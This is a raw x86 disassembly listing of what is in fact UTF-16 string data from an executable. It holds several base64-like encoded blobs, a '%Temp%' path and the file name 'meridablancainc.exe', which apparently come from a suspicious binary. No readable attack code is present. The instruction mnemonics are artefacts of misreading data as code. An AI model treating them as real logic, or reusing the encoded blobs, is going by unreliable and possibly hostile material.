  409f63:	4d                   	dec    %ebp
  409f64:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  409f68:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  409f6c:	00 35 00 4a 00 6f    	add    %dh,0x6f004a00
  409f72:	00 2b                	add    %ch,(%ebx)
  409f74:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  409f78:	00 66 00             	add    %ah,0x0(%esi)
  409f7b:	6c                   	insb   (%dx),%es:(%edi)
  409f7c:	00 73 00             	add    %dh,0x0(%ebx)
  409f7f:	33 00                	xor    (%eax),%eax
  409f81:	69 00 58 00 51 00    	imul   $0x510058,(%eax),%eax
  409f87:	52                   	push   %edx
  409f88:	00 56 00             	add    %dl,0x0(%esi)
  409f8b:	49                   	dec    %ecx
  409f8c:	00 41 00             	add    %al,0x0(%ecx)
  409f8f:	4b                   	dec    %ebx
  409f90:	00 52 00             	add    %dl,0x0(%edx)
  409f93:	6c                   	insb   (%dx),%es:(%edi)
  409f94:	00 67 00             	add    %ah,0x0(%edi)
  409f97:	67 00 41 00          	add    %al,0x0(%bx,%di)
  409f9b:	31 00                	xor    %eax,(%eax)
  409f9d:	37                   	aaa
  409f9e:	00 31                	add    %dh,(%ecx)
  409fa0:	00 47 00             	add    %al,0x0(%edi)
  409fa3:	58                   	pop    %eax
  409fa4:	00 51 00             	add    %dl,0x0(%ecx)
  409fa7:	71 00                	jno    0x409fa9
  409fa9:	2f                   	das
  409faa:	00 56 00             	add    %dl,0x0(%esi)
  409fad:	30 00                	xor    %al,(%eax)
  409faf:	49                   	dec    %ecx
  409fb0:	00 32                	add    %dh,(%edx)
  409fb2:	00 56 00             	add    %dl,0x0(%esi)
  409fb5:	52                   	push   %edx
  409fb6:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  409fba:	00 6f 00             	add    %ch,0x0(%edi)
  409fbd:	34 00                	xor    $0x0,%al
  409fbf:	79 00                	jns    0x409fc1
  409fc1:	55                   	push   %ebp
  409fc2:	00 65 00             	add    %ah,0x0(%ebp)
  409fc5:	77 00                	ja     0x409fc7
  409fc7:	31 00                	xor    %eax,(%eax)
  409fc9:	38 00                	cmp    %al,(%eax)
  409fcb:	4d                   	dec    %ebp
  409fcc:	00 4d 00             	add    %cl,0x0(%ebp)
  409fcf:	39 00                	cmp    %eax,(%eax)
  409fd1:	39 00                	cmp    %eax,(%eax)
  409fd3:	34 00                	xor    $0x0,%al
  409fd5:	6c                   	insb   (%dx),%es:(%edi)
  409fd6:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  409fda:	00 69 00             	add    %ch,0x0(%ecx)
  409fdd:	41                   	inc    %ecx
  409fde:	00 43 00             	add    %al,0x0(%ebx)
  409fe1:	59                   	pop    %ecx
  409fe2:	00 32                	add    %dh,(%edx)
  409fe4:	00 41 00             	add    %al,0x0(%ecx)
  409fe7:	57                   	push   %edi
  409fe8:	00 6f 00             	add    %ch,0x0(%edi)
  409feb:	3d 00 00 82 31       	cmp    $0x31820000,%eax
  409ff0:	4d                   	dec    %ebp
  409ff1:	00 57 00             	add    %dl,0x0(%edi)
  409ff4:	4a                   	dec    %edx
  409ff5:	00 71 00             	add    %dh,0x0(%ecx)
  409ff8:	46                   	inc    %esi
  409ff9:	00 55 00             	add    %dl,0x0(%ebp)
  409ffc:	78 00                	js     0x409ffe
  409ffe:	68 00 50 00 37       	push   $0x37005000
  40a003:	00 32                	add    %dh,(%edx)
  40a005:	00 2b                	add    %ch,(%ebx)
  40a007:	00 61 00             	add    %ah,0x0(%ecx)
  40a00a:	55                   	push   %ebp
  40a00b:	00 46 00             	add    %al,0x0(%esi)
  40a00e:	62 00                	bound  %eax,(%eax)
  40a010:	6f                   	outsl  %ds:(%esi),(%dx)
  40a011:	00 46 00             	add    %al,0x0(%esi)
  40a014:	4e                   	dec    %esi
  40a015:	00 47 00             	add    %al,0x0(%edi)
  40a018:	77 00                	ja     0x40a01a
  40a01a:	61                   	popa
  40a01b:	00 5a 00             	add    %bl,0x0(%edx)
  40a01e:	45                   	inc    %ebp
  40a01f:	00 6e 00             	add    %ch,0x0(%esi)
  40a022:	5a                   	pop    %edx
  40a023:	00 67 00             	add    %ah,0x0(%edi)
  40a026:	49                   	dec    %ecx
  40a027:	00 37                	add    %dh,(%edi)
  40a029:	00 73 00             	add    %dh,0x0(%ebx)
  40a02c:	34 00                	xor    $0x0,%al
  40a02e:	45                   	inc    %ebp
  40a02f:	00 56 00             	add    %dl,0x0(%esi)
  40a032:	51                   	push   %ecx
  40a033:	00 4b 00             	add    %cl,0x0(%ebx)
  40a036:	6f                   	outsl  %ds:(%esi),(%dx)
  40a037:	00 4f 00             	add    %cl,0x0(%edi)
  40a03a:	57                   	push   %edi
  40a03b:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40a03f:	00 6a 00             	add    %ch,0x0(%edx)
  40a042:	50                   	push   %eax
  40a043:	00 69 00             	add    %ch,0x0(%ecx)
  40a046:	37                   	aaa
  40a047:	00 4d 00             	add    %cl,0x0(%ebp)
  40a04a:	68 00 2b 00 6b       	push   $0x6b002b00
  40a04f:	00 67 00             	add    %ah,0x0(%edi)
  40a052:	5a                   	pop    %edx
  40a053:	00 6a 00             	add    %ch,0x0(%edx)
  40a056:	74 00                	je     0x40a058
  40a058:	38 00                	cmp    %al,(%eax)
  40a05a:	6c                   	insb   (%dx),%es:(%edi)
  40a05b:	00 50 00             	add    %dl,0x0(%eax)
  40a05e:	48                   	dec    %eax
  40a05f:	00 57 00             	add    %dl,0x0(%edi)
  40a062:	75 00                	jne    0x40a064
  40a064:	48                   	dec    %eax
  40a065:	00 69 00             	add    %ch,0x0(%ecx)
  40a068:	71 00                	jno    0x40a06a
  40a06a:	4b                   	dec    %ebx
  40a06b:	00 7a 00             	add    %bh,0x0(%edx)
  40a06e:	66 00 42 00          	data16 add %al,0x0(%edx)
  40a072:	30 00                	xor    %al,(%eax)
  40a074:	79 00                	jns    0x40a076
  40a076:	4d                   	dec    %ebp
  40a077:	00 63 00             	add    %ah,0x0(%ebx)
  40a07a:	52                   	push   %edx
  40a07b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a07e:	45                   	inc    %ebp
  40a07f:	00 41 00             	add    %al,0x0(%ecx)
  40a082:	4c                   	dec    %esp
  40a083:	00 46 00             	add    %al,0x0(%esi)
  40a086:	62 00                	bound  %eax,(%eax)
  40a088:	6d                   	insl   (%dx),%es:(%edi)
  40a089:	00 4f 00             	add    %cl,0x0(%edi)
  40a08c:	43                   	inc    %ebx
  40a08d:	00 66 00             	add    %ah,0x0(%esi)
  40a090:	79 00                	jns    0x40a092
  40a092:	4a                   	dec    %edx
  40a093:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40a097:	00 2b                	add    %ch,(%ebx)
  40a099:	00 2f                	add    %ch,(%edi)
  40a09b:	00 6a 00             	add    %ch,0x0(%edx)
  40a09e:	51                   	push   %ecx
  40a09f:	00 48 00             	add    %cl,0x0(%eax)
  40a0a2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0a3:	00 30                	add    %dh,(%eax)
  40a0a5:	00 43 00             	add    %al,0x0(%ebx)
  40a0a8:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a0ac:	4a                   	dec    %edx
  40a0ad:	00 52 00             	add    %dl,0x0(%edx)
  40a0b0:	5a                   	pop    %edx
  40a0b1:	00 52 00             	add    %dl,0x0(%edx)
  40a0b4:	6c                   	insb   (%dx),%es:(%edi)
  40a0b5:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40a0b9:	00 32                	add    %dh,(%edx)
  40a0bb:	00 6f 00             	add    %ch,0x0(%edi)
  40a0be:	57                   	push   %edi
  40a0bf:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40a0c3:	00 46 00             	add    %al,0x0(%esi)
  40a0c6:	51                   	push   %ecx
  40a0c7:	00 6e 00             	add    %ch,0x0(%esi)
  40a0ca:	62 00                	bound  %eax,(%eax)
  40a0cc:	72 00                	jb     0x40a0ce
  40a0ce:	75 00                	jne    0x40a0d0
  40a0d0:	74 00                	je     0x40a0d2
  40a0d2:	74 00                	je     0x40a0d4
  40a0d4:	70 00                	jo     0x40a0d6
  40a0d6:	67 00 75 00          	add    %dh,0x0(%di)
  40a0da:	56                   	push   %esi
  40a0db:	00 42 00             	add    %al,0x0(%edx)
  40a0de:	44                   	inc    %esp
  40a0df:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  40a0e3:	00 2f                	add    %ch,(%edi)
  40a0e5:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40a0e9:	00 52 00             	add    %dl,0x0(%edx)
  40a0ec:	75 00                	jne    0x40a0ee
  40a0ee:	79 00                	jns    0x40a0f0
  40a0f0:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a0f3:	00 51 00             	add    %dl,0x0(%ecx)
  40a0f6:	64 00 37             	add    %dh,%fs:(%edi)
  40a0f9:	00 49 00             	add    %cl,0x0(%ecx)
  40a0fc:	67 00 45 00          	add    %al,0x0(%di)
  40a100:	33 00                	xor    (%eax),%eax
  40a102:	71 00                	jno    0x40a104
  40a104:	39 00                	cmp    %eax,(%eax)
  40a106:	6e                   	outsb  %ds:(%esi),(%dx)
  40a107:	00 33                	add    %dh,(%ebx)
  40a109:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40a10d:	00 62 00             	add    %ah,0x0(%edx)
  40a110:	4f                   	dec    %edi
  40a111:	00 71 00             	add    %dh,0x0(%ecx)
  40a114:	6e                   	outsb  %ds:(%esi),(%dx)
  40a115:	00 49 00             	add    %cl,0x0(%ecx)
  40a118:	41                   	inc    %ecx
  40a119:	00 39                	add    %bh,(%ecx)
  40a11b:	00 55 00             	add    %dl,0x0(%ebp)
  40a11e:	50                   	push   %eax
  40a11f:	00 70 00             	add    %dh,0x0(%eax)
  40a122:	77 00                	ja     0x40a124
  40a124:	49                   	dec    %ecx
  40a125:	00 70 00             	add    %dh,0x0(%eax)
  40a128:	62 00                	bound  %eax,(%eax)
  40a12a:	7a 00                	jp     0x40a12c
  40a12c:	2b 00                	sub    (%eax),%eax
  40a12e:	78 00                	js     0x40a130
  40a130:	50                   	push   %eax
  40a131:	00 73 00             	add    %dh,0x0(%ebx)
  40a134:	32 00                	xor    (%eax),%al
  40a136:	34 00                	xor    $0x0,%al
  40a138:	31 00                	xor    %eax,(%eax)
  40a13a:	33 00                	xor    (%eax),%eax
  40a13c:	56                   	push   %esi
  40a13d:	00 77 00             	add    %dh,0x0(%edi)
  40a140:	45                   	inc    %ebp
  40a141:	00 75 00             	add    %dh,0x0(%ebp)
  40a144:	43                   	inc    %ebx
  40a145:	00 72 00             	add    %dh,0x0(%edx)
  40a148:	58                   	pop    %eax
  40a149:	00 76 00             	add    %dh,0x0(%esi)
  40a14c:	41                   	inc    %ecx
  40a14d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a150:	44                   	inc    %esp
  40a151:	00 65 00             	add    %ah,0x0(%ebp)
  40a154:	4f                   	dec    %edi
  40a155:	00 57 00             	add    %dl,0x0(%edi)
  40a158:	42                   	inc    %edx
  40a159:	00 4a 00             	add    %cl,0x0(%edx)
  40a15c:	4f                   	dec    %edi
  40a15d:	00 66 00             	add    %ah,0x0(%esi)
  40a160:	77 00                	ja     0x40a162
  40a162:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a165:	00 4b 00             	add    %cl,0x0(%ebx)
  40a168:	43                   	inc    %ebx
  40a169:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a16c:	59                   	pop    %ecx
  40a16d:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a171:	00 55 00             	add    %dl,0x0(%ebp)
  40a174:	6c                   	insb   (%dx),%es:(%edi)
  40a175:	00 46 00             	add    %al,0x0(%esi)
  40a178:	48                   	dec    %eax
  40a179:	00 78 00             	add    %bh,0x0(%eax)
  40a17c:	50                   	push   %eax
  40a17d:	00 75 00             	add    %dh,0x0(%ebp)
  40a180:	4d                   	dec    %ebp
  40a181:	00 48 00             	add    %cl,0x0(%eax)
  40a184:	42                   	inc    %edx
  40a185:	00 6a 00             	add    %ch,0x0(%edx)
  40a188:	53                   	push   %ebx
  40a189:	00 38                	add    %bh,(%eax)
  40a18b:	00 75 00             	add    %dh,0x0(%ebp)
  40a18e:	6a 00                	push   $0x0
  40a190:	6e                   	outsb  %ds:(%esi),(%dx)
  40a191:	00 67 00             	add    %ah,0x0(%edi)
  40a194:	76 00                	jbe    0x40a196
  40a196:	35 00 59 00 33       	xor    $0x33005900,%eax
  40a19b:	00 31                	add    %dh,(%ecx)
  40a19d:	00 52 00             	add    %dl,0x0(%edx)
  40a1a0:	78 00                	js     0x40a1a2
  40a1a2:	69 00 4b 00 66 00    	imul   $0x66004b,(%eax),%eax
  40a1a8:	61                   	popa
  40a1a9:	00 77 00             	add    %dh,0x0(%edi)
  40a1ac:	76 00                	jbe    0x40a1ae
  40a1ae:	55                   	push   %ebp
  40a1af:	00 42 00             	add    %al,0x0(%edx)
  40a1b2:	30 00                	xor    %al,(%eax)
  40a1b4:	39 00                	cmp    %eax,(%eax)
  40a1b6:	36 00 38             	add    %bh,%ss:(%eax)
  40a1b9:	00 62 00             	add    %ah,0x0(%edx)
  40a1bc:	51                   	push   %ecx
  40a1bd:	00 7a 00             	add    %bh,0x0(%edx)
  40a1c0:	2f                   	das
  40a1c1:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40a1c5:	00 45 00             	add    %al,0x0(%ebp)
  40a1c8:	76 00                	jbe    0x40a1ca
  40a1ca:	4c                   	dec    %esp
  40a1cb:	00 43 00             	add    %al,0x0(%ebx)
  40a1ce:	76 00                	jbe    0x40a1d0
  40a1d0:	35 00 52 00 48       	xor    $0x48005200,%eax
  40a1d5:	00 76 00             	add    %dh,0x0(%esi)
  40a1d8:	49                   	dec    %ecx
  40a1d9:	00 6f 00             	add    %ch,0x0(%edi)
  40a1dc:	52                   	push   %edx
  40a1dd:	00 4f 00             	add    %cl,0x0(%edi)
  40a1e0:	48                   	dec    %eax
  40a1e1:	00 39                	add    %bh,(%ecx)
  40a1e3:	00 7a 00             	add    %bh,0x0(%edx)
  40a1e6:	51                   	push   %ecx
  40a1e7:	00 71 00             	add    %dh,0x0(%ecx)
  40a1ea:	42                   	inc    %edx
  40a1eb:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40a1ef:	00 56 00             	add    %dl,0x0(%esi)
  40a1f2:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a1f6:	6b 00 72             	imul   $0x72,(%eax),%eax
  40a1f9:	00 73 00             	add    %dh,0x0(%ebx)
  40a1fc:	32 00                	xor    (%eax),%al
  40a1fe:	39 00                	cmp    %eax,(%eax)
  40a200:	7a 00                	jp     0x40a202
  40a202:	78 00                	js     0x40a204
  40a204:	38 00                	cmp    %al,(%eax)
  40a206:	35 00 73 00 36       	xor    $0x36007300,%eax
  40a20b:	00 68 00             	add    %ch,0x0(%eax)
  40a20e:	30 00                	xor    %al,(%eax)
  40a210:	52                   	push   %edx
  40a211:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40a215:	00 55 00             	add    %dl,0x0(%ebp)
  40a218:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40a21c:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a221:	80 b1 43 00 51 00 61 	xorb   $0x61,0x510043(%ecx)
  40a228:	00 69 00             	add    %ch,0x0(%ecx)
  40a22b:	44                   	inc    %esp
  40a22c:	00 50 00             	add    %dl,0x0(%eax)
  40a22f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a230:	00 62 00             	add    %ah,0x0(%edx)
  40a233:	50                   	push   %eax
  40a234:	00 45 00             	add    %al,0x0(%ebp)
  40a237:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40a23b:	71 00                	jno    0x40a23d
  40a23d:	6a 00                	push   $0x0
  40a23f:	75 00                	jne    0x40a241
  40a241:	74 00                	je     0x40a243
  40a243:	53                   	push   %ebx
  40a244:	00 75 00             	add    %dh,0x0(%ebp)
  40a247:	32 00                	xor    (%eax),%al
  40a249:	5a                   	pop    %edx
  40a24a:	00 45 00             	add    %al,0x0(%ebp)
  40a24d:	33 00                	xor    (%eax),%eax
  40a24f:	2b 00                	sub    (%eax),%eax
  40a251:	58                   	pop    %eax
  40a252:	00 45 00             	add    %al,0x0(%ebp)
  40a255:	30 00                	xor    %al,(%eax)
  40a257:	4c                   	dec    %esp
  40a258:	00 66 00             	add    %ah,0x0(%esi)
  40a25b:	4b                   	dec    %ebx
  40a25c:	00 4f 00             	add    %cl,0x0(%edi)
  40a25f:	35 00 57 00 76       	xor    $0x76005700,%eax
  40a264:	00 67 00             	add    %ah,0x0(%edi)
  40a267:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a26a:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40a26e:	00 4e 00             	add    %cl,0x0(%esi)
  40a271:	41                   	inc    %ecx
  40a272:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40a276:	00 63 00             	add    %ah,0x0(%ebx)
  40a279:	5a                   	pop    %edx
  40a27a:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40a27e:	00 69 00             	add    %ch,0x0(%ecx)
  40a281:	73 00                	jae    0x40a283
  40a283:	45                   	inc    %ebp
  40a284:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40a288:	00 72 00             	add    %dh,0x0(%edx)
  40a28b:	41                   	inc    %ecx
  40a28c:	00 52 00             	add    %dl,0x0(%edx)
  40a28f:	37                   	aaa
  40a290:	00 50 00             	add    %dl,0x0(%eax)
  40a293:	39 00                	cmp    %eax,(%eax)
  40a295:	55                   	push   %ebp
  40a296:	00 53 00             	add    %dl,0x0(%ebx)
  40a299:	47                   	inc    %edi
  40a29a:	00 71 00             	add    %dh,0x0(%ecx)
  40a29d:	53                   	push   %ebx
  40a29e:	00 36                	add    %dh,(%esi)
  40a2a0:	00 57 00             	add    %dl,0x0(%edi)
  40a2a3:	78 00                	js     0x40a2a5
  40a2a5:	4a                   	dec    %edx
  40a2a6:	00 32                	add    %dh,(%edx)
  40a2a8:	00 65 00             	add    %ah,0x0(%ebp)
  40a2ab:	44                   	inc    %esp
  40a2ac:	00 79 00             	add    %bh,0x0(%ecx)
  40a2af:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40a2b2:	00 33                	add    %dh,(%ebx)
  40a2b4:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2b7:	71 00                	jno    0x40a2b9
  40a2b9:	57                   	push   %edi
  40a2ba:	00 52 00             	add    %dl,0x0(%edx)
  40a2bd:	46                   	inc    %esi
  40a2be:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40a2c2:	00 46 00             	add    %al,0x0(%esi)
  40a2c5:	4e                   	dec    %esi
  40a2c6:	00 39                	add    %bh,(%ecx)
  40a2c8:	00 55 00             	add    %dl,0x0(%ebp)
  40a2cb:	72 00                	jb     0x40a2cd
  40a2cd:	41                   	inc    %ecx
  40a2ce:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a2d4:	80 b1 57 00 58 00 70 	xorb   $0x70,0x580057(%ecx)
  40a2db:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40a2df:	00 71 00             	add    %dh,0x0(%ecx)
  40a2e2:	49                   	dec    %ecx
  40a2e3:	00 56 00             	add    %dl,0x0(%esi)
  40a2e6:	58                   	pop    %eax
  40a2e7:	00 37                	add    %dh,(%edi)
  40a2e9:	00 63 00             	add    %ah,0x0(%ebx)
  40a2ec:	47                   	inc    %edi
  40a2ed:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40a2f1:	00 78 00             	add    %bh,0x0(%eax)
  40a2f4:	38 00                	cmp    %al,(%eax)
  40a2f6:	4a                   	dec    %edx
  40a2f7:	00 50 00             	add    %dl,0x0(%eax)
  40a2fa:	75 00                	jne    0x40a2fc
  40a2fc:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40a300:	4e                   	dec    %esi
  40a301:	00 62 00             	add    %ah,0x0(%edx)
  40a304:	57                   	push   %edi
  40a305:	00 51 00             	add    %dl,0x0(%ecx)
  40a308:	5a                   	pop    %edx
  40a309:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  40a30d:	00 65 00             	add    %ah,0x0(%ebp)
  40a310:	72 00                	jb     0x40a312
  40a312:	57                   	push   %edi
  40a313:	00 7a 00             	add    %bh,0x0(%edx)
  40a316:	41                   	inc    %ecx
  40a317:	00 65 00             	add    %ah,0x0(%ebp)
  40a31a:	69 00 76 00 35 00    	imul   $0x350076,(%eax),%eax
  40a320:	2f                   	das
  40a321:	00 48 00             	add    %cl,0x0(%eax)
  40a324:	69 00 62 00 7a 00    	imul   $0x7a0062,(%eax),%eax
  40a32a:	73 00                	jae    0x40a32c
  40a32c:	6c                   	insb   (%dx),%es:(%edi)
  40a32d:	00 63 00             	add    %ah,0x0(%ebx)
  40a330:	53                   	push   %ebx
  40a331:	00 6d 00             	add    %ch,0x0(%ebp)
  40a334:	58                   	pop    %eax
  40a335:	00 6e 00             	add    %ch,0x0(%esi)
  40a338:	64 00 74 00 42       	add    %dh,%fs:0x42(%eax,%eax,1)
  40a33d:	00 56 00             	add    %dl,0x0(%esi)
  40a340:	58                   	pop    %eax
  40a341:	00 5a 00             	add    %bl,0x0(%edx)
  40a344:	52                   	push   %edx
  40a345:	00 2f                	add    %ch,(%edi)
  40a347:	00 67 00             	add    %ah,0x0(%edi)
  40a34a:	68 00 58 00 71       	push   $0x71005800
  40a34f:	00 72 00             	add    %dh,0x0(%edx)
  40a352:	79 00                	jns    0x40a354
  40a354:	70 00                	jo     0x40a356
  40a356:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a35a:	31 00                	xor    %eax,(%eax)
  40a35c:	59                   	pop    %ecx
  40a35d:	00 62 00             	add    %ah,0x0(%edx)
  40a360:	32 00                	xor    (%eax),%al
  40a362:	6b 00 73             	imul   $0x73,(%eax),%eax
  40a365:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40a369:	00 63 00             	add    %ah,0x0(%ebx)
  40a36c:	41                   	inc    %ecx
  40a36d:	00 72 00             	add    %dh,0x0(%edx)
  40a370:	59                   	pop    %ecx
  40a371:	00 6a 00             	add    %ch,0x0(%edx)
  40a374:	42                   	inc    %edx
  40a375:	00 63 00             	add    %ah,0x0(%ebx)
  40a378:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a37c:	70 00                	jo     0x40a37e
  40a37e:	7a 00                	jp     0x40a380
  40a380:	67 00 3d             	add    %bh,(%di)
  40a383:	00 3d 00 00 0d 25    	add    %bh,0x250d0000
  40a389:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40a38d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a390:	70 00                	jo     0x40a392
  40a392:	25 00 00 27 6d       	and    $0x6d270000,%eax
  40a397:	00 65 00             	add    %ah,0x0(%ebp)
  40a39a:	72 00                	jb     0x40a39c
  40a39c:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  40a3a2:	62 00                	bound  %eax,(%eax)
  40a3a4:	6c                   	insb   (%dx),%es:(%edi)
  40a3a5:	00 61 00             	add    %ah,0x0(%ecx)
  40a3a8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3a9:	00 63 00             	add    %ah,0x0(%ebx)
  40a3ac:	61                   	popa
  40a3ad:	00 69 00             	add    %ch,0x0(%ecx)
  40a3b0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3b1:	00 63 00             	add    %ah,0x0(%ebx)
  40a3b4:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a3b8:	78 00                	js     0x40a3ba
  40a3ba:	65 00 00             	add    %al,%gs:(%eax)
  40a3bd:	59                   	pop    %ecx
  40a3be:	63 00                	arpl   %eax,(%eax)
  40a3c0:	47                   	inc    %edi
  40a3c1:	00 46 00             	add    %al,0x0(%esi)
  40a3c4:	57                   	push   %edi
  40a3c5:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40a3c9:	00 68 00             	add    %ch,0x0(%eax)
  40a3cc:	32 00                	xor    (%eax),%al
  40a3ce:	5a                   	pop    %edx
  40a3cf:	00 55 00             	add    %dl,0x0(%ebp)
  40a3d2:	4e                   	dec    %esi
  40a3d3:	00 6e 00             	add    %ch,0x0(%esi)
  40a3d6:	52                   	push   %edx
  40a3d7:	00 32                	add    %dh,(%edx)
  40a3d9:	00 4a 00             	add    %cl,0x0(%edx)
  40a3dc:	75 00                	jne    0x40a3de
  40a3de:	4e                   	dec    %esi
  40a3df:	00 55 00             	add    %dl,0x0(%ebp)
  40a3e2:	49                   	dec    %ecx
  40a3e3:	00 35 00 62 00 33    	add    %dh,0x33006200
  40a3e9:	00 46 00             	add    %al,0x0(%esi)
  40a3ec:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40a3f0:	6d                   	insl   (%dx),%es:(%edi)
  40a3f1:	00 68 00             	add    %ch,0x0(%eax)
  40a3f4:	73 00                	jae    0x40a3f6
  40a3f6:	5a                   	pop    %edx
  40a3f7:	00 55 00             	add    %dl,0x0(%ebp)
  40a3fa:	78 00                	js     0x40a3fc
  40a3fc:	55                   	push   %ebp
  40a3fd:	00 65 00             	add    %ah,0x0(%ebp)
  40a400:	48                   	dec    %eax
  40a401:	00 42 00             	add    %al,0x0(%edx)
  40a404:	6e                   	outsb  %ds:(%esi),(%dx)
  40a405:	00 51 00             	add    %dl,0x0(%ecx)
  40a408:	6d                   	insl   (%dx),%es:(%edi)
  40a409:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a40d:	00 61 00             	add    %ah,0x0(%ecx)
  40a410:	45                   	inc    %ebp
  40a411:	00 73 00             	add    %dh,0x0(%ebx)
  40a414:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40a419:	34 00                	xor    $0x0,%al
  40a41b:	4e                   	dec    %esi
  40a41c:	00 38                	add    %bh,(%eax)
  40a41e:	00 63 00             	add    %ah,0x0(%ebx)
  40a421:	55                   	push   %ebp
  40a422:	00 73 00             	add    %dh,0x0(%ebx)
  40a425:	61                   	popa
  40a426:	00 52 00             	add    %dl,0x0(%edx)
  40a429:	6c                   	insb   (%dx),%es:(%edi)
  40a42a:	00 41 00             	add    %al,0x0(%ecx)
  40a42d:	4e                   	dec    %esi
  40a42e:	00 78 00             	add    %bh,0x0(%eax)
  40a431:	4c                   	dec    %esp
  40a432:	00 63 00             	add    %ah,0x0(%ebx)
  40a435:	4d                   	dec    %ebp
  40a436:	00 6d 00             	add    %ch,0x0(%ebp)
  40a439:	46                   	inc    %esi
  40a43a:	00 37                	add    %dh,(%edi)
  40a43c:	00 37                	add    %dh,(%edi)
  40a43e:	00 50 00             	add    %dl,0x0(%eax)
  40a441:	75 00                	jne    0x40a443
  40a443:	73 00                	jae    0x40a445
  40a445:	55                   	push   %ebp
  40a446:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40a44a:	00 42 00             	add    %al,0x0(%edx)
  40a44d:	4c                   	dec    %esp
  40a44e:	00 6f 00             	add    %ch,0x0(%edi)
  40a451:	44                   	inc    %esp
  40a452:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40a456:	00 59 00             	add    %bl,0x0(%ecx)
  40a459:	30 00                	xor    %al,(%eax)
  40a45b:	75 00                	jne    0x40a45d
  40a45d:	55                   	push   %ebp
  40a45e:	00 66 00             	add    %ah,0x0(%esi)
  40a461:	35 00 30 00 75       	xor    $0x75003000,%eax
  40a466:	00 62 00             	add    %ah,0x0(%edx)
  40a469:	61                   	popa
  40a46a:	00 61 00             	add    %ah,0x0(%ecx)
  40a46d:	79 00                	jns    0x40a46f
  40a46f:	35 00 39 00 4c       	xor    $0x4c003900,%eax
  40a474:	00 36                	add    %dh,(%esi)
  40a476:	00 70 00             	add    %dh,0x0(%eax)
  40a479:	68 00 72 00 39       	push   $0x39007200
  40a47e:	00 4a 00             	add    %cl,0x0(%edx)
  40a481:	43                   	inc    %ebx
  40a482:	00 4b 00             	add    %cl,0x0(%ebx)
  40a485:	65 00 44 00 59       	add    %al,%gs:0x59(%eax,%eax,1)
  40a48a:	00 79 00             	add    %bh,0x0(%ecx)
  40a48d:	6b 00 74             	imul   $0x74,(%eax),%eax
  40a490:	00 30                	add    %dh,(%eax)
  40a492:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40a496:	00 78 00             	add    %bh,0x0(%eax)
  40a499:	71 00                	jno    0x40a49b
  40a49b:	4d                   	dec    %ebp
  40a49c:	00 71 00             	add    %dh,0x0(%ecx)
  40a49f:	65 00 2f             	add    %ch,%gs:(%edi)
  40a4a2:	00 77 00             	add    %dh,0x0(%edi)
  40a4a5:	30 00                	xor    %al,(%eax)
  40a4a7:	79 00                	jns    0x40a4a9
  40a4a9:	68 00 57 00 77       	push   $0x77005700
  40a4ae:	00 41 00             	add    %al,0x0(%ecx)
  40a4b1:	4f                   	dec    %edi
  40a4b2:	00 78 00             	add    %bh,0x0(%eax)
  40a4b5:	72 00                	jb     0x40a4b7
  40a4b7:	44                   	inc    %esp
  40a4b8:	00 2f                	add    %ch,(%edi)
  40a4ba:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40a4be:	00 4d 00             	add    %cl,0x0(%ebp)
  40a4c1:	68 00 67 00 3d       	push   $0x3d006700
  40a4c6:	00 3d 00 00 92 59    	add    %bh,0x59920000
